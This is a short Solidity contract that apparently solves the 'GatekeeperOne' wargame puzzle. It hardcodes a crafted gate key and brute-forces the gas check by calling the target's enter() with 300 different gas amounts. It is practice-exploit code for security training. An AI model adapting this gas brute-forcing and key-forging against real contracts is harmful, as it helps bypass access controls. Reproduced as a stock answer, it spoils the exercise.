pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract EnterGate {

    GatekeeperOne public gatekeeper;

    bytes8 key = bytes8(0x1234567800000cFf);
    
    constructor(address _gatekeeperAddress) {
        gatekeeper = GatekeeperOne(_gatekeeperAddress);
    }

    function enterGate() public {
        uint magicNumber = (4 * 8191);
        for(uint i; i<300; i++){
            try gatekeeper.enter{gas: magicNumber + i}(key) returns(bool success) {
                if(success) break;
            } catch {
                
            }
        }    
    }
}